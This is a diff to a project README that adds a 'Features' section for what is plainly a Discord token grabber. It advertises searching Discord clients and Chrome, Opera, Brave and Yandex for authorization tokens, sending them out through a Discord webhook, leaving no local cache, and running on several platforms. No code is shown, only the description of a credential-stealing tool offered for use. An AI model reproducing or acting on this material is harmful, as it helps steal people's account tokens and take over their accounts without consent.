@@ -9,10 +9,19 @@
 
 ## Table of Contents
 
+- [Features](#features)
 - [Getting Started](#getting-started)
 - [Usage](#usage)
 - [Supported Operating Systems](#supported-operating-systems)
 - [Supported Softwares](#supported-softwares)
+
+## Features
+
+- No local caching
+- Transfers via Discord webhook
+- Searches for authorization tokens in multiple directories (Discord, Discord PTB, Discord Canary, Google chrome, Opera, Brave and Yandex)
+- No external Python modules required
+- Cross-platform support
 
 ## Getting Started
 
